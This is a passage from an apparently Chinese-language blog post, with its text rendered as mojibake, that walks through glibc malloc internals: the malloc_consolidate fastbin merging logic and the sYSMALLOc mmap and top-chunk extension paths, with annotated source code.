class="params">(av)</span> mstate av;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;  <span class="comment">// é¦–å…ˆåˆ¤æ–­åˆ†é…åŒºæ˜¯å¦åˆå§‹åŒ–ï¼Œå¦‚æœæ²¡æœ‰å°±è°ƒåˆ°æœ€ååˆå§‹åŒ–åˆ†é…åŒº</span></span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);  <span class="comment">// è·å– unsortedbin é“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="comment">/* It is wrong to limit the fast bins to search using get_max_fast</span></span><br><span class="line"><span class="comment">       because, except for the main arena, all the others might have</span></span><br><span class="line"><span class="comment">       blocks in the high fast bins.  It&#x27;s not worth it anyway, just</span></span><br><span class="line"><span class="comment">       search all bins all the time.  */</span></span><br><span class="line">    maxfb = &amp;fastbin (av, fastbin_index(get_max_fast ()));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);  <span class="comment">// è·å–æœ€å¤§çš„ fastbin é“¾è¡¨</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);  <span class="comment">// å–å‡ºç¬¬ä¸€æ¡é“¾è¡¨</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      p = *fb;  <span class="comment">// å–å‡ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå †å—</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;  <span class="comment">// åˆ¤æ–­è¡¨æ˜¯å¦ä¸ºç©º</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	*fb = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">do</span> &#123;  <span class="comment">// éå†é“¾è¡¨</span></span><br><span class="line">	  check_inuse_chunk(av, p);</span><br><span class="line">	  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">	  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">	  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!prev_inuse(p)) &#123;  <span class="comment">// åˆ¤æ–­æ˜¯å¦å¯ä»¥åå‘åˆå¹¶</span></span><br><span class="line">	    prevsize = p-&gt;prev_size;</span><br><span class="line">	    size += prevsize;</span><br><span class="line">	    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">	    unlink(p, bck, fwd);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;   <span class="comment">// åˆ¤æ–­å½“å‰å †å—ç‰©ç†ä¸Šçš„ä¸‹ä¸€ä¸ªå †å—æ˜¯å¦æ˜¯ top chunk</span></span><br><span class="line">	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (!nextinuse) &#123;  <span class="comment">// åˆ¤æ–­æ˜¯å¦å¯ä»¥å‰å‘åˆå¹¶</span></span><br><span class="line">	      size += nextsize;</span><br><span class="line">	      unlink(nextchunk, bck, fwd);</span><br><span class="line">	    &#125; <span class="keyword">else</span></span><br><span class="line">	      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	    unsorted_bin-&gt;fd = p;</span><br><span class="line">	    first_unsorted-&gt;bk = p;    <span class="comment">// å°†åˆå¹¶åçš„å †å—æ’å…¥åˆ° unsorted bin</span></span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;   <span class="comment">// å¦‚æœåˆå¹¶ä¹‹åçš„ chunk æ˜¯ä¸€ä¸ª large bin chunk</span></span><br><span class="line">	      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      p-&gt;bk_nextsize = <span class="literal">NULL</span>;    <span class="comment">// unsortedbin ä¸­ è¿™ä¸¤ä¸ªæŒ‡é’ˆæ— ç”¨ï¼Œæ¸…ç©º</span></span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    set_head(p, size | PREV_INUSE);</span><br><span class="line">	    p-&gt;bk = unsorted_bin;</span><br><span class="line">	    p-&gt;fd = first_unsorted;</span><br><span class="line">	    set_foot(p, size);    <span class="comment">// å°† largebin chunk æ’å…¥ unsortedbin</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">else</span> &#123;</span><br><span class="line">	    size += nextsize;    <span class="comment">// å¦‚æœå’Œ top chunk ç›¸é‚»ï¼Œåˆ™ä¸ topchunk åˆå¹¶</span></span><br><span class="line">	    set_head(p, size | PREV_INUSE);</span><br><span class="line">	    av-&gt;top = p;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);  <span class="comment">// åˆå§‹åŒ–åˆ†é…åŒº</span></span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>consolidate çš„é€»è¾‘è¿˜ç®—ç®€å•ï¼Œä¸»è¦æ˜¯å¯¹ fastbin è¿›è¡Œæ“ä½œï¼Œé¦–å…ˆè¦åˆ¤æ–­åˆ†é…åŒºæ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœæ˜¯ï¼Œä¼šé€ä¸ª fastbin é“¾è¡¨è¿›è¡Œéå†ï¼Œå¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œå°±è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªé“¾è¡¨ï¼Œå¦‚æœä¸ç©ºï¼Œå°±ä¾æ¬¡å–å‡ºå…¶ä¸­çš„ chunkï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œåå‘åˆå¹¶ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦èƒ½è¿›è¡Œå‰å‘åˆå¹¶ï¼Œæœ€ååˆ¤æ–­èƒ½å¦ä¸ topchunk åˆå¹¶ï¼Œåœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œè¦è€ƒè™‘åˆ°åˆå¹¶å‡ºæ¥çš„å †å—æ˜¯ smallbin è¿˜æ˜¯ largebinï¼Œä»¥ä¾¿äºç”¨ä¸åŒçš„æ–¹å¼æ’å…¥ unsortedbinã€‚å‚è€ƒä¸‹å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_8.png"
                      alt="malloc_free_8.png"
                ></p>
<h2 id="sYSMALLOc"><a href="#sYSMALLOc" class="headerlink" title="sYSMALLOc"></a>sYSMALLOc</h2><p>è¿™ä¸ªå‡½æ•°ä¼šåœ¨æ‰€æœ‰ç¼“å†²åŒºå’Œ topchunk éƒ½ä¸èƒ½æ»¡è¶³åˆ†é…è¦æ±‚æ—¶è°ƒç”¨ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å‘æ“ä½œç³»ç»Ÿç”³è¯·æ–°çš„å†…å­˜ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __STD_C</span></span><br><span class="line"><span class="type">static</span> Void_t* <span class="title function_">sYSMALLOc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> Void_t* <span class="title function_">sYSMALLOc</span><span class="params">(nb, av)</span> INTERNAL_SIZE_T nb; mstate av;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr       old_top;        <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">char</span>*           old_end;        <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span>            size;           <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="type">char</span>*           brk;            <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span>            correction;     <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="type">char</span>*           snd_brk;        <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="type">char</span>*           aligned_brk;    <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr       p;              <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr       remainder;      <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span>   remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span>   sum;            <span class="comment">/* for updating stats */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span>          pagemask  = mp_.pagesize - <span class="number">1</span>;</span><br><span class="line">  <span class="type">bool</span>            tried_mmap = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆæ˜¯å„ç§å˜é‡çš„å®šä¹‰ï¼Œå®ƒä»¬çš„åŠŸèƒ½åœ¨æ³¨é‡Šé‡Œé¢å†™çš„æ¯”è¾ƒæ¸…æ¥šã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MMAP</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">      (mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mm;             <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Round up size to nearest page.  For mmapped chunks, the overhead</span></span><br><span class="line"><span class="comment">      is one SIZE_SZ unit larger than for normal chunks, because there</span></span><br><span class="line"><span class="comment">      is no following chunk whose prev_size field could be used.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">    <span class="comment">/* See the front_misalign handling below, for glibc there is no</span></span><br><span class="line"><span class="comment">       need for further alignments.  */</span></span><br><span class="line">    size = (nb + SIZE_SZ + pagemask) &amp; ~pagemask;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    size = (nb + SIZE_SZ + MALLOC_ALIGN_MASK + pagemask) &amp; ~pagemask;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€åˆ¤æ–­ä¸€ä¸‹ HAVE_MMAP å®å®šä¹‰æ˜¯å¦ä¸º 1ï¼Œå¼•ç”¨ malloc.c çš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Define HAVE_MMAP as true to optionally make malloc() use mmap() to</span><br><span class="line">  allocate very large blocks.  These will be returned to the</span><br><span class="line">  operating system immediately after a free(). Also, if mmap</span><br><span class="line">  is available, it is used as a backup strategy in cases where</span><br><span class="line">  MORECORE fails to provide space from system.</span><br><span class="line"></span><br><span class="line">  This malloc is best tuned to work with mmap for large requests.</span><br><span class="line">  If you do not have mmap, operations involving very large chunks (1MB</span><br><span class="line">  or so) may be slower than you&#x27;d like.</span><br></pre></td></tr></table></figure></div>

<p>é€‰é¡¹æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œè¿™æ˜¯å› ä¸ºæœ‰äº›æ“ä½œç³»ç»Ÿå¹¶ä¸æ”¯æŒ mmapï¼Œåˆæˆ–è€…ç”¨æˆ·ä¸å¸Œæœ›ç¨‹åºä½¿ç”¨ mmap å‘ç³»ç»Ÿç”³è¯·ç©ºé—´ï¼Œå°±å¯ä»¥å°†è¿™ä¸ªé€‰é¡¹å…³é—­ã€‚</p>
<p>ç„¶åä¼šåˆ¤æ–­æ˜¯å¦èƒ½é€šè¿‡ mmap åˆ†é…å†…å­˜ï¼Œéœ€è¦æ»¡è¶³ 2 ä¸ªæ¡ä»¶ï¼Œä¸€æ˜¯ nb å¤§äºç­‰äº mmap çš„åˆ†é…é˜ˆå€¼ï¼ŒäºŒæ˜¯å½“å‰è¿›ç¨‹é€šè¿‡ mmap æ–¹å¼åˆ†é…çš„å†…å­˜æ€»é‡å°äºæœ€å¤§å€¼ï¼Œè¿™ä¸¤ä¸ªæœ€å¤§å€¼åˆ†åˆ«æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEFAULT_MMAP_THRESHOLD     128 * 1024</span><br><span class="line">DEFAULT_MMAP_MAX       (65536)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œç¬¬äºŒä¸ªåˆ¤æ–­ä¼¼ä¹æ€»èƒ½æˆåŠŸï¼Œæœ‰äº†è§£çš„å¤§å“¥è¯·å‘Šè¯‰æˆ‘</p>
</blockquote>
<p>å¦‚æœä¸Šé¢ä¸¤ä¸ªæ¡ä»¶éƒ½èƒ½æ»¡è¶³ï¼Œå°±ä¼šè¿›å…¥åˆ° mmap çš„åˆ†é…æµç¨‹ï¼Œé¦–å…ˆè¦é‡æ–°è®¡ç®— sizeï¼Œå¼•ç”¨ malloc.c çš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Round up size to nearest page.  For mmapped chunks, the overhead</span><br><span class="line">      is one SIZE_SZ unit larger than for normal chunks, because there</span><br><span class="line">      is no following chunk whose prev_size field could be used.</span><br></pre></td></tr></table></figure></div>

<p>é‡æ–°è®¡ç®— size çš„åŸå› æœ‰ä¸¤ä¸ªï¼Œä¸€æ˜¯ mmap åˆ†é…çš„å†…å­˜å—å¿…é¡»é¡µå¯¹é½ï¼ŒäºŒæ˜¯ mmap åˆ†é…å‡ºæ¥çš„å †å—æ²¡æœ‰ä¸‹ä¸€ä¸ªå †å—çš„ prev_size ç©ºé—´å¯ä»¥å¤ç”¨ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è®¡ç®— sizeã€‚</p>
<p>è®¡ç®— size ä¹‹åä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line"></span><br><span class="line">      mm = (<span class="type">char</span>*)(MMAP(<span class="number">0</span>, size, PROT_READ|PROT_WRITE, MAP_PRIVATE));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (mm != MAP_FAILED) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	  The offset to the start of the mmapped region is stored</span></span><br><span class="line"><span class="comment">	  in the prev_size field of the chunk. This allows us to adjust</span></span><br><span class="line"><span class="comment">	  returned start address to meet alignment requirements here</span></span><br><span class="line"><span class="comment">	  and in memalign(), and still be able to compute proper</span></span><br><span class="line"><span class="comment">	  address argument for later munmap in free() and realloc().</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">	<span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment">	   MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span></span><br><span class="line"><span class="comment">	   aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br><span class="line">	assert (((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">	<span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	  correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">	  p = (mchunkptr)(mm + correction);</span><br><span class="line">	  p-&gt;prev_size = correction;</span><br><span class="line">	  set_head(p, (size - correction) |IS_MMAPPED);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  &#123;</span><br><span class="line">	    p = (mchunkptr)mm;</span><br><span class="line">	    set_head(p, size|IS_MMAPPED);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* update statistics */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (++mp_.n_mmaps &gt; mp_.max_n_mmaps)</span><br><span class="line">	  mp_.max_n_mmaps = mp_.n_mmaps;</span><br><span class="line"></span><br><span class="line">	sum = mp_.mmapped_mem += size;</span><br><span class="line">	<span class="keyword">if</span> (sum &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.max_mmapped_mem))</span><br><span class="line">	  mp_.max_mmapped_mem = sum;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> NO_THREADS</span></span><br><span class="line">	sum += av-&gt;system_mem;</span><br><span class="line">	<span class="keyword">if</span> (sum &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.max_total_mem))</span><br><span class="line">	  mp_.max_total_mem = sum;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	check_chunk(av, p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆè¦åˆ¤æ–­ size æ˜¯å¦å°äº nbï¼Œå¦‚æœå‡ºç°è¿™ç§æƒ…å†µï¼Œè¯´æ˜ size å‘ç”Ÿäº†æº¢å‡ºï¼Œä¸ä¼šç»§ç»­åˆ†é…å†…å­˜ï¼Œå¦åˆ™è¿›å…¥åˆ°ä¸»è¦çš„ mmap é€»è¾‘ã€‚ ç›´æ¥è°ƒç”¨ mmap å‡½æ•°å°è¯•åˆ†é…ä¸€ä¸ªå †å—ï¼Œåˆ†é…æˆåŠŸå°±ä¸éœ€è¦è¿›ä¸€æ­¥æ£€æŸ¥å¯¹é½çš„é—®é¢˜äº†ï¼Œå› ä¸º mmap çš„å †å—æœ¬æ¥å°±æ˜¯é¡µå¯¹é½çš„ã€‚</p>
<p>ä¹‹åä¼šå°†å †å—çš„ IS_MMAPED æ ‡å¿—ä½ç½® 1ï¼Œè¡¨ç¤ºå®ƒæ˜¯é€šè¿‡ mmap æ–¹å¼åˆ†é…å‡ºæ¥çš„ã€‚ä¹‹åå°±æ˜¯ä¸€äº›æ›´æ–°å…¨å±€å˜é‡çš„æ“ä½œï¼Œå¹¶ä¸”è¿”å›å †å—ã€‚</p>
<p>å¦‚æœåœ¨ mmap è¿™ä¸€æ”¯ä¸èƒ½æˆåŠŸåˆ†é…å †å—ï¼Œæœ‰ 3 ç§æƒ…å†µï¼Œä¸€æ˜¯ nb å¤§äº mmap çš„åˆ†é…é˜ˆå€¼ï¼ŒäºŒæ˜¯ size å‘ç”Ÿæº¢å‡ºï¼Œä¸èƒ½é€šè¿‡ mmap åˆ†é…ï¼Œä¸‰æ˜¯ mmap åˆ†é…å¤±è´¥ã€‚</p>
<p>å¦‚æœå‘ç”Ÿä¸Šé¢çš„ä¸‰ç§æƒ…å†µï¼Œä¼šè¿›å…¥åˆ°ä¸‹ä¸€ä¸ªé˜¶æ®µï¼Œå³æ‹“å±• top chunk</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">  old_top  = av-&gt;top;</span><br><span class="line">  old_size = chunksize(old_top);</span><br><span class="line">  old_end  = (<span class="type">char</span>*)(chunk_at_offset(old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span>*)(MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">	 ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">	  prev_inuse(old_top) &amp;&amp;</span><br><span class="line">	  ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE));</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ATOMIC_FASTBINS</span></span><br><span class="line">  <span class="comment">/* Precondition: all fastbins are consolidated */</span></span><br><span class="line">  assert(!have_fastchunks(av));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆä¿å­˜æ—§çš„ top chunk ä¿¡æ¯ï¼Œç„¶ååˆ¤æ–­ top chunk æ˜¯å¦åˆæ³•ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œï¼Œtop chunk æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œsize ç­‰äº 0ï¼ŒäºŒæ˜¯å·²ç»è¢«åˆå§‹åŒ–ï¼Œä½†æ˜¯ size ä¸èƒ½æ»¡è¶³ nbï¼Œè¿™ä½¿å°±è¦æ±‚ size å¤§äº MINSIZE ï¼Œå¹¶ä¸” prev_inuse æ ‡å¿—ä½ä¸º 1ï¼Œå¹¶ä¸” top chunk çš„å°¾éƒ¨æ˜¯å¯¹é½çš„ã€‚</p>
<p>æœ€ä¸‹é¢æ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„åˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ ATOMIC_FASTBINSï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œæ‰€æœ‰çš„ fastbin chunk ä¸€å®šæ˜¯é€šè¿‡ consolidate åˆå¹¶è¿‡äº†ï¼Œå¦‚æœè¿˜æœ‰ fastbin chunk æ®‹ç•™åœ¨é“¾è¡¨ä¸­ï¼Œè¯´æ˜å‘ç”Ÿäº†ä¸€äº›é”™è¯¯ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena) &#123;  <span class="comment">// å½“å‰åˆ†é…åŒºä¸æ˜¯ä¸»åˆ†é…åŒº</span></span><br><span class="line"></span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr(old_top); </span><br><span class="line">    old_heap_size = old_heap-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">	&amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>) &#123;  <span class="comment">// å°è¯•æ‰©å±•å½“å‰ heap</span></span><br><span class="line">      av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">      arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      <span class="keyword">if</span>(mmapped_mem + arena_mem + sbrked_mem &gt; max_total_mem)</span><br><span class="line">	max_total_mem = mmapped_mem + arena_mem + sbrked_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      set_head(old_top, (((<span class="type">char</span> *)old_heap + old_heap-&gt;size) - (<span class="type">char</span> *)old_top)</span><br><span class="line">	       | PREV_INUSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap(nb + (MINSIZE + <span class="keyword">sizeof</span>(*heap)), mp_.top_pad))) &#123;  <span class="comment">// æ‰©å±• heap å¤±è´¥ï¼Œå°è¯•åˆ†é…æ–°çš„ heap</span></span><br><span class="line">      <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">      heap-&gt;ar_ptr = av;</span><br><span class="line">      heap-&gt;prev = old_heap;</span><br><span class="line">      av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">      arena_mem += heap-&gt;size;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      <span class="keyword">if</span>((<span class="type">unsigned</span> <span class="type">long</span>)(mmapped_mem + arena_mem + sbrked_mem) &gt; max_total_mem)</span><br><span class="line">	max_total_mem = mmapped_mem + arena_mem + sbrked_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">      top(av) = chunk_at_offset(heap, <span 